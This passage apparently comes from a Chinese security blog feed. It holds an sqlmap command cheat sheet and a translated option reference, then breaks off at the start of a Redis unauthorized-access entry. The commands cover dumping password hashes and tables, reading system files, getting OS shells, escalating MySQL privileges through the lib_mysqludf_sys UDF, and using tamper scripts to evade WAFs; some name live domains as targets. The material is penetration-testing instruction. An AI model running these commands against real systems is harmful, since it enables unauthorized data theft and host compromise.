<li><h4 id="URL重写SQL注入测试"><a href="#URL重写SQL注入测试" class="headerlink" title="URL重写SQL注入测试"></a>URL重写SQL注入测试</h4><ol>
<li><p>value1为测试参数，加“*”即可，sqlmap将会测试value1的位置是否可注入。</p>
<p>sqlmap -u”<a href="http://targeturl/param1/value1*/param2/value2/”" target="_blank" rel="noopener">http://targeturl/param1/value1*/param2/value2/”</a></p>
</li>
</ol>
</li>
<li><h4 id="列举并破解密码哈希值"><a href="#列举并破解密码哈希值" class="headerlink" title="列举并破解密码哈希值"></a>列举并破解密码哈希值</h4><ol>
<li><p>当前用户有权限读取包含用户密码的权限时，sqlmap会现列举出用户，然后列出hash，并尝试破解。</p>
<p>sqlmap -u”<a href="http://192.168.136.131/sqlmap/pgsql/get_int.php?id=1”" target="_blank" rel="noopener">http://192.168.136.131/sqlmap/pgsql/get_int.php?id=1”</a> –passwords -v1</p>
</li>
</ol>
</li>
<li><h4 id="获取表中的数据个数"><a href="#获取表中的数据个数" class="headerlink" title="获取表中的数据个数"></a>获取表中的数据个数</h4><ol>
<li>sqlmap -u”<a href="http://192.168.21.129/sqlmap/mssql/iis/get_int.asp?id=1”" target="_blank" rel="noopener">http://192.168.21.129/sqlmap/mssql/iis/get_int.asp?id=1”</a> –count -Dtestdb</li>
</ol>
</li>
<li><h4 id="对网站secbang-com进行漏洞爬取"><a href="#对网站secbang-com进行漏洞爬取" class="headerlink" title="对网站secbang.com进行漏洞爬取"></a>对网站secbang.com进行漏洞爬取</h4><ol>
<li>sqlmap -u “<a href="http://www.secbang.com/" target="_blank" rel="noopener">http://www.secbang.com</a>“–batch –crawl=3</li>
</ol>
</li>
<li><h4 id="基于布尔SQL注入预估时间"><a href="#基于布尔SQL注入预估时间" class="headerlink" title="基于布尔SQL注入预估时间"></a>基于布尔SQL注入预估时间</h4><ol>
<li>sqlmap -u “<a href="http://192.168.136.131/sqlmap/oracle/get_int_bool.php?id=1“-b" target="_blank" rel="noopener">http://192.168.136.131/sqlmap/oracle/get_int_bool.php?id=1“-b</a> –eta</li>
</ol>
</li>
<li><h4 id="使用hex避免字符编码导致数据丢失"><a href="#使用hex避免字符编码导致数据丢失" class="headerlink" title="使用hex避免字符编码导致数据丢失"></a>使用hex避免字符编码导致数据丢失</h4><ol>
<li>sqlmap -u “<a href="http://192.168.48.130/pgsql/get_int.php?id=1”" target="_blank" rel="noopener">http://192.168.48.130/pgsql/get_int.php?id=1”</a> –banner –hex -v 3 –parse-errors</li>
</ol>
</li>
<li><h4 id="模拟测试手机环境站点"><a href="#模拟测试手机环境站点" class="headerlink" title="模拟测试手机环境站点"></a>模拟测试手机环境站点</h4><ol>
<li>sqlmap -u”<a href="http://www.target.com/vuln.php?id=1”" target="_blank" rel="noopener">http://www.target.com/vuln.php?id=1”</a> –mobile</li>
</ol>
</li>
<li><h4 id="智能判断测试"><a href="#智能判断测试" class="headerlink" title="智能判断测试"></a>智能判断测试</h4><ol>
<li>sqlmap -u “<a href="http://www.antian365.com/info.php?id=1“–batch" target="_blank" rel="noopener">http://www.antian365.com/info.php?id=1“–batch</a> –smart</li>
</ol>
</li>
<li><h4 id="结合burpsuite进行注入"><a href="#结合burpsuite进行注入" class="headerlink" title="结合burpsuite进行注入"></a>结合burpsuite进行注入</h4><ol>
<li><p>burpsuite抓包，需要设置burpsuite记录请求日志</p>
<p>sqlmap -r burpsuite抓包.txt</p>
</li>
<li><p>指定表单注入</p>
<p>sqlmap -u URL –data“username=a&amp;password=a”</p>
</li>
</ol>
</li>
<li><h4 id="sqlmap自动填写表单注入"><a href="#sqlmap自动填写表单注入" class="headerlink" title="sqlmap自动填写表单注入"></a>sqlmap自动填写表单注入</h4><ol>
<li><p>sqlmap -u URL –forms</p>
<p>sqlmap -u URL –forms –dbs</p>
<p>sqlmap -u URL –forms –current-db</p>
<p>sqlmap -u URL –forms -D 数据库名称–tables</p>
<p>sqlmap -u URL –forms -D 数据库名称 -T 表名 –columns</p>
<p>sqlmap -u URL –forms -D 数据库名称 -T 表名 -Cusername，password –dump</p>
</li>
</ol>
</li>
<li><h4 id="读取linux下文件"><a href="#读取linux下文件" class="headerlink" title="读取linux下文件"></a>读取linux下文件</h4><ol>
<li>sqlmap-u “url” –file /etc/password</li>
</ol>
</li>
<li><h4 id="延时注入"><a href="#延时注入" class="headerlink" title="延时注入"></a>延时注入</h4><ol>
<li>sqlmap -u URL –technique -T–current-user</li>
</ol>
</li>
<li><h4 id="sqlmap-结合burpsuite进行post注入"><a href="#sqlmap-结合burpsuite进行post注入" class="headerlink" title="sqlmap 结合burpsuite进行post注入"></a>sqlmap 结合burpsuite进行post注入</h4><ol>
<li><p>结合burpsuite来使用sqlmap：</p>
<p>（1）浏览器打开目标地址<a href="http://www.antian365.com/" target="_blank" rel="noopener">http://www.antian365.com</a></p>
<p>（2）配置burp代理(127.0.0.1:8080)以拦截请求</p>
<p>（3）点击登录表单的submit按钮</p>
<p>（4）Burp会拦截到了我们的登录POST请求</p>
<p>（5）把这个post请求复制为txt, 我这命名为post.txt 然后把它放至sqlmap目录下</p>
<p>（6）运行sqlmap并使用如下命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;sqlmap -r post.txt -p tfUPass</span><br></pre></td></tr></table></figure>
</li>
</ol>
</li>
<li><h4 id="sqlmap-cookies注入"><a href="#sqlmap-cookies注入" class="headerlink" title="sqlmap cookies注入"></a>sqlmap cookies注入</h4><ol>
<li><p>sqlmap -u “<a href="http://127.0.0.1/base.PHP“–cookies" target="_blank" rel="noopener">http://127.0.0.1/base.PHP“–cookies</a> “id=1″ –dbs –level 2</p>
<p>默认情况下SQLMAP只支持GET/POST参数的注入测试，但是当使用–level 参数且数值&gt;=2的时候也会检查cookie里面的参数，当&gt;=3的时候将检查User-agent和Referer。可以通过burpsuite等工具获取当前的cookie值，然后进行注入：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u 注入点URL --cookie&quot;id&#x3D;xx&quot; --level 3</span><br><span class="line">sqlmap -u url --cookie &quot;id&#x3D;xx&quot;--level 3 --tables(猜表名)</span><br><span class="line">sqlmap -u url --cookie &quot;id&#x3D;xx&quot;--level 3 -T 表名 --coiumns</span><br><span class="line">sqlmap -u url --cookie &quot;id&#x3D;xx&quot;--level 3 -T 表名 -C username，password --dump</span><br></pre></td></tr></table></figure>
</li>
</ol>
</li>
<li><h4 id="mysql提权"><a href="#mysql提权" class="headerlink" title="mysql提权"></a>mysql提权</h4><ol>
<li><p>连接mysql数据打开一个交互shell:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -dmysql:&#x2F;&#x2F;root:root@127.0.0.1:3306&#x2F;test --sql-shell</span><br><span class="line">select @@version;</span><br><span class="line">select @@plugin_dir;</span><br><span class="line">d:\\wamp2.5\\bin\\mysql\\mysql5.6.17\\lib\\plugin\\</span><br></pre></td></tr></table></figure>
</li>
<li><p>利用sqlmap上传lib_mysqludf_sys到MySQL插件目录:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -dmysql:&#x2F;&#x2F;root:root@127.0.0.1:3306&#x2F;test --file-write&#x3D;d:&#x2F;tmp&#x2F;lib_mysqludf_sys.dll--file-dest&#x3D;d:\\wamp2.5\\bin\\mysql\\mysql5.6.17\\lib\\plugin\\lib_mysqludf_sys.dll</span><br><span class="line">CREATE FUNCTION sys_exec RETURNS STRINGSONAME &#39;lib_mysqludf_sys.dll&#39;</span><br><span class="line">CREATE FUNCTION sys_eval RETURNS STRINGSONAME &#39;lib_mysqludf_sys.dll&#39;</span><br><span class="line">select sys_eval(&#39;ver&#39;);</span><br></pre></td></tr></table></figure>



</li>
</ol>
</li>
</ol>
</li>
</ol>
<ol start="7">
<li><h4 id="执行shell命令"><a href="#执行shell命令" class="headerlink" title="执行shell命令"></a>执行shell命令</h4><ol>
<li><p>sqlmap -u “url” –os-cmd=”netuser” /<em>执行net user命令</em>/</p>
<p>sqlmap -u “url” –os-shell /<em>系统交互的shell</em>/</p>
</li>
</ol>
<ol start="8">
<li><h4 id="延时注入-1"><a href="#延时注入-1" class="headerlink" title="延时注入"></a>延时注入</h4><ol>
<li><p>sqlmap –dbs -u”url” –delay 0.5 /<em>延时0.5秒</em>/</p>
<p>sqlmap –dbs -u”url” –safe-freq /<em>请求2次</em>/</p>
</li>
</ol>
</li>
</ol>
</li>
</ol>
]]></content>
      <categories>
        <category>工具</category>
      </categories>
  </entry>
  <entry>
    <title>sqlmap详细参数使用</title>
    <url>/2020/07/10/sqlmap%E8%AF%A6%E7%BB%86%E5%8F%82%E6%95%B0%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<h2 id="Options（选项）："><a href="#Options（选项）：" class="headerlink" title="Options（选项）："></a>Options（选项）：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--version 显示程序的版本号并退出</span><br><span class="line"></span><br><span class="line">-h, --help 显示此帮助消息并退出</span><br><span class="line"></span><br><span class="line">-v VERBOSE 详细级别：0-6（默认为 1）</span><br></pre></td></tr></table></figure>

<h3 id="Target（目标）："><a href="#Target（目标）：" class="headerlink" title="Target（目标）："></a>Target（目标）：</h3><h4 id="以下至少需要设置其中一个选项，设置目标-URL。"><a href="#以下至少需要设置其中一个选项，设置目标-URL。" class="headerlink" title="以下至少需要设置其中一个选项，设置目标 URL。"></a>以下至少需要设置其中一个选项，设置目标 URL。</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-d DIRECT 直接连接到数据库。</span><br><span class="line"></span><br><span class="line">-u URL, --url&#x3D;URL 目标 URL。 </span><br><span class="line"></span><br><span class="line">-l LIST 从 Burp 或 WebScarab 代理的日志中解析目标。</span><br><span class="line"></span><br><span class="line">-r REQUESTFILE 从一个文件中载入 HTTP 请求。</span><br><span class="line"></span><br><span class="line">-g GOOGLEDORK 处理 Google dork 的结果作为目标 URL。 </span><br><span class="line"></span><br><span class="line">-c CONFIGFILE 从 INI 配置文件中加载选项。</span><br></pre></td></tr></table></figure>

<h3 id="Request（请求）："><a href="#Request（请求）：" class="headerlink" title="Request（请求）：:"></a>Request（请求）：:</h3><h4 id="这些选项可以用来指定如何连接到目标-URL。"><a href="#这些选项可以用来指定如何连接到目标-URL。" class="headerlink" title="这些选项可以用来指定如何连接到目标 URL。"></a>这些选项可以用来指定如何连接到目标 URL。</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--data&#x3D;DATA 通过 POST 发送的数据字符串</span><br><span class="line"></span><br><span class="line">--cookie&#x3D;COOKIE HTTP Cookie 头</span><br><span class="line"></span><br><span class="line">--cookie-urlencode URL 编码生成的 cookie 注入</span><br><span class="line"></span><br><span class="line">--drop-set-cookie 忽略响应的 Set - Cookie 头信息--user-agent&#x3D;AGENT 指定 HTTP User - Agent 头</span><br><span class="line"></span><br><span class="line">--random-agent 使用随机选定的 HTTP User - Agent 头</span><br><span class="line"></span><br><span class="line">--referer&#x3D;REFERER 指定 HTTP Referer 头</span><br><span class="line"></span><br><span class="line">--headers&#x3D;HEADERS 换行分开，加入其他的 HTTP 头</span><br><span class="line"></span><br><span class="line">--auth-type&#x3D;ATYPE HTTP 身份验证类型（基本，摘要或 NTLM）(Basic, Digest or NTLM)</span><br><span class="line"></span><br><span class="line">--auth-cred&#x3D;ACRED HTTP 身份验证凭据（用户名:密码）</span><br><span class="line"></span><br><span class="line">--auth-cert&#x3D;ACERT HTTP 认证证书（key_file，cert_file）</span><br><span class="line"></span><br><span class="line">--proxy&#x3D;PROXY 使用 HTTP 代理连接到目标 URL</span><br><span class="line"></span><br><span class="line">--proxy-cred&#x3D;PCRED HTTP 代理身份验证凭据（用户名：密码）</span><br><span class="line"></span><br><span class="line">--ignore-proxy 忽略系统默认的 HTTP 代理</span><br><span class="line"></span><br><span class="line">--delay&#x3D;DELAY 在每个 HTTP 请求之间的延迟时间，单位为秒</span><br><span class="line"></span><br><span class="line">--timeout&#x3D;TIMEOUT 等待连接超时的时间（默认为 30 秒）</span><br><span class="line"></span><br><span class="line">--retries&#x3D;RETRIES 连接超时后重新连接的时间（默认 3）</span><br><span class="line"></span><br><span class="line">--scope&#x3D;SCOPE 从所提供的代理日志中过滤器目标的正则表达式</span><br><span class="line"></span><br><span class="line">--safe-url&#x3D;SAFURL 在测试过程中经常访问的 url 地址</span><br><span class="line"></span><br><span class="line">--safe-freq&#x3D;SAFREQ 两次访问之间测试请求，给出安全的 URL</span><br></pre></td></tr></table></figure>

<h3 id="Optimization（优化）："><a href="#Optimization（优化）：" class="headerlink" title="Optimization（优化）："></a>Optimization（优化）：</h3><h4 id="这些选项可用于优化-SqlMap-的性能。"><a href="#这些选项可用于优化-SqlMap-的性能。" class="headerlink" title="这些选项可用于优化 SqlMap 的性能。"></a>这些选项可用于优化 SqlMap 的性能。</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-o 开启所有优化开关</span><br><span class="line"></span><br><span class="line">--predict-output 预测常见的查询输出</span><br><span class="line"></span><br><span class="line">--keep-alive 使用持久的 HTTP（S）连接</span><br><span class="line"></span><br><span class="line">--null-connection 从没有实际的 HTTP 响应体中检索页面长度</span><br><span class="line"></span><br><span class="line">--threads&#x3D;THREADS 最大的 HTTP（S）请求并发量（默认为 1）</span><br></pre></td></tr></table></figure>

<h3 id="Injection（注入）："><a href="#Injection（注入）：" class="headerlink" title="Injection（注入）："></a>Injection（注入）：</h3><h4 id="这些选项可以用来指定测试哪些参数，-提供自定义的注入-payloads-和可选篡改脚本。"><a href="#这些选项可以用来指定测试哪些参数，-提供自定义的注入-payloads-和可选篡改脚本。" class="headerlink" title="这些选项可以用来指定测试哪些参数， 提供自定义的注入 payloads 和可选篡改脚本。"></a>这些选项可以用来指定测试哪些参数， 提供自定义的注入 payloads 和可选篡改脚本。</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-p TESTPARAMETER 可测试的参数（S）</span><br><span class="line"></span><br><span class="line">--dbms&#x3D;DBMS 强制后端的 DBMS 为此值</span><br><span class="line"></span><br><span class="line">--os&#x3D;OS 强制后端的 DBMS 操作系统为这个值</span><br><span class="line"></span><br><span class="line">--prefix&#x3D;PREFIX 注入 payload 字符串前缀</span><br><span class="line"></span><br><span class="line">--suffix&#x3D;SUFFIX 注入 payload 字符串后缀</span><br><span class="line"></span><br><span class="line">--tamper&#x3D;TAMPER 使用给定的脚本（S）篡改注入数据</span><br></pre></td></tr></table></figure>

<h3 id="Detection（检测）："><a href="#Detection（检测）：" class="headerlink" title="Detection（检测）："></a>Detection（检测）：</h3><h4 id="这些选项可以用来指定在-SQL-盲注时如何解析和比较-HTTP-响应页面的内容。"><a href="#这些选项可以用来指定在-SQL-盲注时如何解析和比较-HTTP-响应页面的内容。" class="headerlink" title="这些选项可以用来指定在 SQL 盲注时如何解析和比较 HTTP 响应页面的内容。"></a>这些选项可以用来指定在 SQL 盲注时如何解析和比较 HTTP 响应页面的内容。</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--level&#x3D;LEVEL 执行测试的等级（1-5，默认为 1）</span><br><span class="line"></span><br><span class="line">--risk&#x3D;RISK 执行测试的风险（0-3，默认为 1）</span><br><span class="line"></span><br><span class="line">--string&#x3D;STRING 查询时有效时在页面匹配字符串</span><br><span class="line"></span><br><span class="line">--regexp&#x3D;REGEXP 查询时有效时在页面匹配正则表达式</span><br><span class="line"></span><br><span class="line">--text-only 仅基于在文本内容比较网页</span><br></pre></td></tr></table></figure>

<h3 id="Techniques（技巧）："><a href="#Techniques（技巧）：" class="headerlink" title="Techniques（技巧）："></a>Techniques（技巧）：</h3><h4 id="这些选项可用于调整具体的-SQL-注入测试。"><a href="#这些选项可用于调整具体的-SQL-注入测试。" class="headerlink" title="这些选项可用于调整具体的 SQL 注入测试。"></a>这些选项可用于调整具体的 SQL 注入测试。</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--technique&#x3D;TECH SQL 注入技术测试（默认 BEUST）</span><br><span class="line">--technique  指定注入类型 其值为B、E、U、S、T或Q，含义如下:</span><br><span class="line">B：Boolean-based blind（布尔型注入）</span><br><span class="line">E：Error-based（报错型注入）</span><br><span class="line">U：Union query-based（可联合查询注入）</span><br><span class="line">S：Stacked queries（可多语句查询注入）</span><br><span class="line">T：Time-based blind（基于时间延迟注入）</span><br><span class="line">Q：Inline queries（嵌套查询注入）</span><br><span class="line"></span><br><span class="line">--time-sec&#x3D;TIMESEC DBMS 响应的延迟时间（默认为 5 秒）</span><br><span class="line"></span><br><span class="line">--union-cols&#x3D;UCOLS 定列范围用于测试 UNION 查询注入</span><br><span class="line"></span><br><span class="line">--union-char&#x3D;UCHAR 用于暴力猜解列数的字符</span><br></pre></td></tr></table></figure>

<h3 id="Fingerprint（指纹）："><a href="#Fingerprint（指纹）：" class="headerlink" title="Fingerprint（指纹）："></a>Fingerprint（指纹）：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-f, --fingerprint 执行检查广泛的 DBMS 版本指纹</span><br><span class="line"></span><br><span class="line">Enumeration（枚举）：这些选项可以用来列举后端数据库管理系统的信息、表中的结构和数据。此外，您还可以运行您自己的 SQL 语句。</span><br><span class="line"></span><br><span class="line">-b, --banner 检索数据库管理系统的标识</span><br><span class="line"></span><br><span class="line">--current-user 检索数据库管理系统当前用户</span><br><span class="line"></span><br><span class="line">--current-db 检索数据库管理系统当前数据库</span><br><span class="line"></span><br><span class="line">--is-dba 检测 DBMS 当前用户是否 DBA</span><br><span class="line"></span><br><span class="line">--users 枚举数据库管理系统用户</span><br><span class="line"></span><br><span class="line">--passwords 枚举数据库管理系统用户密码哈希</span><br><span class="line"></span><br><span class="line">--privileges 枚举数据库管理系统用户的权限</span><br><span class="line"></span><br><span class="line">--roles 枚举数据库管理系统用户的角色</span><br><span class="line"></span><br><span class="line">--dbs 枚举数据库管理系统数据库</span><br><span class="line"></span><br><span class="line">--tables 枚举的 DBMS 数据库中的表</span><br><span class="line"></span><br><span class="line">--columns 枚举 DBMS 数据库表列</span><br><span class="line"></span><br><span class="line">--dump 转储数据库管理系统的数据库中的表项</span><br><span class="line"></span><br><span class="line">--dump-all 转储所有的 DBMS 数据库表中的条目</span><br><span class="line"></span><br><span class="line">--search 搜索列（S），表（S）和&#x2F;或数据库名称（S） </span><br><span class="line"></span><br><span class="line">-D DB 要进行枚举的数据库名</span><br><span class="line"></span><br><span class="line">-T TBL 要进行枚举的数据库表</span><br><span class="line"></span><br><span class="line">-C COL 要进行枚举的数据库列</span><br><span class="line"></span><br><span class="line">-U USER 用来进行枚举的数据库用户</span><br><span class="line"></span><br><span class="line">--exclude-sysdbs 枚举表时排除系统数据库</span><br><span class="line"></span><br><span class="line">--start&#x3D;LIMITSTART 第一个查询输出进入检索</span><br><span class="line"></span><br><span class="line">--stop&#x3D;LIMITSTOP 最后查询的输出进入检索</span><br><span class="line"></span><br><span class="line">--first&#x3D;FIRSTCHAR 第一个查询输出字的字符检索</span><br><span class="line"></span><br><span class="line">--last&#x3D;LASTCHAR 最后查询的输出字字符检索</span><br><span class="line"></span><br><span class="line">--sql-query&#x3D;QUERY 要执行的 SQL 语句</span><br><span class="line"></span><br><span class="line">--sql-shell 提示交互式 SQL 的 shell</span><br><span class="line"></span><br><span class="line">###</span><br></pre></td></tr></table></figure>

<h3 id="Brute-force（蛮力）："><a href="#Brute-force（蛮力）：" class="headerlink" title="Brute force（蛮力）："></a>Brute force（蛮力）：</h3><h4 id="这些选项可以被用来运行蛮力检查。"><a href="#这些选项可以被用来运行蛮力检查。" class="headerlink" title="这些选项可以被用来运行蛮力检查。"></a>这些选项可以被用来运行蛮力检查。</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--common-tables 检查存在共同表</span><br><span class="line"></span><br><span class="line">--common-columns 检查存在共同列</span><br><span class="line"></span><br><span class="line">User-defined function injection（用户自定义函数注入）：</span><br><span class="line"></span><br><span class="line">这些选项可以用来创建用户自定义函数。</span><br><span class="line"></span><br><span class="line">--udf-inject 注入用户自定义函数</span><br><span class="line"></span><br><span class="line">--shared-lib&#x3D;SHLIB 共享库的本地路径</span><br></pre></td></tr></table></figure>



<h3 id="File-system-access（访问文件系统）："><a href="#File-system-access（访问文件系统）：" class="headerlink" title="File system access（访问文件系统）："></a>File system access（访问文件系统）：</h3><h4 id="这些选项可以被用来访问后端数据库管理系统的底层文件系统。"><a href="#这些选项可以被用来访问后端数据库管理系统的底层文件系统。" class="headerlink" title="这些选项可以被用来访问后端数据库管理系统的底层文件系统。"></a>这些选项可以被用来访问后端数据库管理系统的底层文件系统。</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--file-read&#x3D;RFILE 从后端的数据库管理系统文件系统读取文件</span><br><span class="line"></span><br><span class="line">--file-write&#x3D;WFILE 编辑后端的数据库管理系统文件系统上的本地文件</span><br><span class="line"></span><br><span class="line">--file-dest&#x3D;DFILE 后端的数据库管理系统写入文件的绝对路径</span><br></pre></td></tr></table></figure>



<h3 id="Operating-system-access（操作系统访问）："><a href="#Operating-system-access（操作系统访问）：" class="headerlink" title="Operating system access（操作系统访问）："></a>Operating system access（操作系统访问）：</h3><h4 id="这些选项可以用于访问后端数据库管理系统的底层操作系统。"><a href="#这些选项可以用于访问后端数据库管理系统的底层操作系统。" class="headerlink" title="这些选项可以用于访问后端数据库管理系统的底层操作系统。"></a>这些选项可以用于访问后端数据库管理系统的底层操作系统。</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--os-cmd&#x3D;OSCMD 执行操作系统命令</span><br><span class="line"></span><br><span class="line">--os-shell 交互式的操作系统的 shell</span><br><span class="line"></span><br><span class="line">--os-pwn 获取一个 OOB shell，meterpreter 或 VNC</span><br><span class="line"></span><br><span class="line">--os-smbrelay 一键获取一个 OOB shell，meterpreter 或 VNC</span><br><span class="line"></span><br><span class="line">--os-bof 存储过程缓冲区溢出利用</span><br><span class="line"></span><br><span class="line">--priv-esc 数据库进程用户权限提升</span><br><span class="line"></span><br><span class="line">--msf-path&#x3D;MSFPATH Metasploit Framework 本地的安装路径</span><br><span class="line"></span><br><span class="line">--tmp-path&#x3D;TMPPATH 远程临时文件目录的绝对路径</span><br></pre></td></tr></table></figure>

<h3 id="Windows-注册表访问："><a href="#Windows-注册表访问：" class="headerlink" title="Windows 注册表访问："></a>Windows 注册表访问：</h3><h4 id="这些选项可以被用来访问后端数据库管理系统-Windows-注册表。"><a href="#这些选项可以被用来访问后端数据库管理系统-Windows-注册表。" class="headerlink" title="这些选项可以被用来访问后端数据库管理系统 Windows 注册表。"></a>这些选项可以被用来访问后端数据库管理系统 Windows 注册表。</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--reg-read 读一个 Windows 注册表项值</span><br><span class="line"></span><br><span class="line">--reg-add 写一个 Windows 注册表项值数据</span><br><span class="line"></span><br><span class="line">--reg-del 删除 Windows 注册表键值</span><br><span class="line"></span><br><span class="line">--reg-key&#x3D;REGKEY Windows 注册表键</span><br><span class="line"></span><br><span class="line">--reg-value&#x3D;REGVAL Windows 注册表项值</span><br><span class="line"></span><br><span class="line">--reg-data&#x3D;REGDATA Windows 注册表键值数据</span><br><span class="line"></span><br><span class="line">--reg-type&#x3D;REGTYPE Windows 注册表项值类型</span><br></pre></td></tr></table></figure>



<h3 id="General（一般）："><a href="#General（一般）：" class="headerlink" title="General（一般）："></a>General（一般）：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">这些选项可以用来设置一些一般的工作参数。</span><br><span class="line"></span><br><span class="line">-t TRAFFICFILE 记录所有 HTTP 流量到一个文本文件中</span><br><span class="line"></span><br><span class="line">-s SESSIONFILE 保存和恢复检索会话文件的所有数据</span><br><span class="line"></span><br><span class="line">--flush-session 刷新当前目标的会话文件</span><br><span class="line"></span><br><span class="line">--fresh-queries 忽略在会话文件中存储的查询结果</span><br><span class="line"></span><br><span class="line">--eta 显示每个输出的预计到达时间</span><br><span class="line"></span><br><span class="line">--update 更新 SqlMap</span><br><span class="line"></span><br><span class="line">--save file 保存选项到 INI 配置文件</span><br><span class="line"></span><br><span class="line">--batch 从不询问用户输入，使用所有默认配置。</span><br></pre></td></tr></table></figure>



<h3 id="Miscellaneous（杂项）："><a href="#Miscellaneous（杂项）：" class="headerlink" title="Miscellaneous（杂项）："></a>Miscellaneous（杂项）：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--beep 发现 SQL 注入时提醒</span><br><span class="line"></span><br><span class="line">--check-payload IDS 对注入 payloads 的检测测试</span><br><span class="line"></span><br><span class="line">--cleanup SqlMap 具体的 UDF 和表清理 DBMS</span><br><span class="line"></span><br><span class="line">--forms 对目标 URL 的解析和测试形式</span><br><span class="line"></span><br><span class="line">--gpage&#x3D;GOOGLEPAGE 从指定的页码使用谷歌 dork 结果</span><br><span class="line"></span><br><span class="line">--page-rank Google dork 结果显示网页排名（PR）</span><br><span class="line"></span><br><span class="line">--parse-errors 从响应页面解析数据库管理系统的错误消息</span><br><span class="line"></span><br><span class="line">--replicate 复制转储的数据到一个 sqlite3 数据库</span><br><span class="line"></span><br><span class="line">--tor 使用默认的 Tor（Vidalia&#x2F; Privoxy&#x2F; Polipo）代理地址</span><br><span class="line"></span><br><span class="line">--wizard 给初级用户的简单向导界面</span><br></pre></td></tr></table></figure>

<h3 id="tamper脚本"><a href="#tamper脚本" class="headerlink" title="tamper脚本"></a>tamper脚本</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">序号	脚本名称	注释</span><br><span class="line">1	0x2char	将每个编码后的字符转换为等价表达</span><br><span class="line">2	apostrophemask	单引号替换为Utf8字符</span><br><span class="line">3	apostrophenullencode	替换双引号为%00%27</span><br><span class="line">4	appendnullbyte	有效代码后添加%00</span><br><span class="line">5	base64encode	使用base64编码</span><br><span class="line">6	between	比较符替换为between</span><br><span class="line">7	bluecoat	空格替换为随机空白字符，等号替换为like</span><br><span class="line">8	chardoubleencode	双url编码</span><br><span class="line">9	charencode	将url编码</span><br><span class="line">10	charunicodeencode	使用unicode编码</span><br><span class="line">11	charunicodeescape	以指定的payload反向编码未编码的字符</span><br><span class="line">12	commalesslimit	改变limit语句的写法</span><br><span class="line">13	commalessmid	改变mid语句的写法</span><br><span class="line">14	commentbeforeparentheses	在括号前加内联注释</span><br><span class="line">15	concat2concatws	替换CONCAT为CONCAT_WS</span><br><span class="line">16	equaltolike	等号替换为like</span><br><span class="line">17	escapequotes	双引号替换为\\\\</span><br><span class="line">18	greatest	大于号替换为greatest</span><br><span class="line">19	halfversionedmorekeywords	在每个关键字前加注释</span><br><span class="line">20	htmlencode	html编码所有非字母和数字的字符</span><br><span class="line">21	ifnull2casewhenisnull	改变ifnull语句的写法</span><br><span class="line">22	ifnull2ifisnull	替换ifnull为if(isnull(A))</span><br><span class="line">23	informationschemacomment	标示符后添加注释</span><br><span class="line">24	least	替换大于号为least</span><br><span class="line">25	lowercase	全部替换为小写值</span><br><span class="line">26	modsecurityversioned	空格替换为查询版本的注释</span><br><span class="line">27	modsecurityzeroversioned	添加完整的查询版本的注释</span><br><span class="line">28	multiplespaces	添加多个空格</span><br><span class="line">29	nonrecursivereplacement	替换预定义的关键字</span><br><span class="line">30	overlongutf8	将所有字符转义为utf8</span><br><span class="line">31	overlongutf8more	以指定的payload转换所有字符</span><br><span class="line">32	percentage	每个字符前添加%</span><br><span class="line">33	plus2concat	将加号替换为concat函数</span><br><span class="line">34	plus2fnconcat	将加号替换为ODBC函数&#123;fn CONCAT()&#125;</span><br><span class="line">35	randomcase	字符大小写随机替换</span><br><span class="line">36	randomcomments	&#x2F;**&#x2F;分割关键字</span><br><span class="line">37	securesphere	添加某字符串</span><br><span class="line">38	sp_password	追加sp_password字符串</span><br><span class="line">39	space2comment	空格替换为&#x2F;**&#x2F;</span><br><span class="line">40	space2dash	空格替换为–加随机字符</span><br><span class="line">41	space2hash	空格替换为#加随机字符</span><br><span class="line">42	space2morecomment	空格替换为&#x2F;**_**&#x2F;</span><br><span class="line">43	space2morehash	空格替换为#加随机字符及换行符</span><br><span class="line">44	space2mssqlblank	空格替换为其他空符号</span><br><span class="line">45	space2mssqlhash	空格替换为%23%0A</span><br><span class="line">46	space2mysqlblank	空格替换为其他空白符号</span><br><span class="line">47	space2mysqldash	空格替换为–%0A</span><br><span class="line">48	space2plus	空格替换为加号</span><br><span class="line">49	space2randomblank	空格替换为备选字符集中的随机字符</span><br><span class="line">50	symboliclogical	AND和OR替换为&amp;&amp;和||</span><br><span class="line">51	unionalltounion	union all select替换为union select</span><br><span class="line">52	unmagicquotes	宽字符绕过GPC</span><br><span class="line">53	uppercase	全部替换为大写值</span><br><span class="line">54	varnish	添加HTTP头</span><br><span class="line">55	versionedkeywords	用注释封装每个非函数的关键字</span><br><span class="line">56	versionedmorekeywords	使用注释绕过</span><br><span class="line">57	xforwardedfor	添加伪造的HTTP头</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>工具</category>
      </categories>
  </entry>
  <entry>
    <title>某些服务未授权访问漏洞</title>
    <url>/2020/07/20/%E6%9F%90%E4%BA%9B%E6%9C%8D%E5%8A%A1%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h2 id="0x01-Redis未授权访问"><a href="#0x01-Redis未授权访问" class="headerlink" title="0x01 Redis未授权访问"></a>0x01 Redis未授权访问</h2><h4 id="1-扫描探测"><a href="#1-扫描探测" class="headerlink" title="1.扫描探测"></a>1.扫描探测</h4><p><strong>(1). 测试时建议 vim /etc/redis.conf</strong></p>
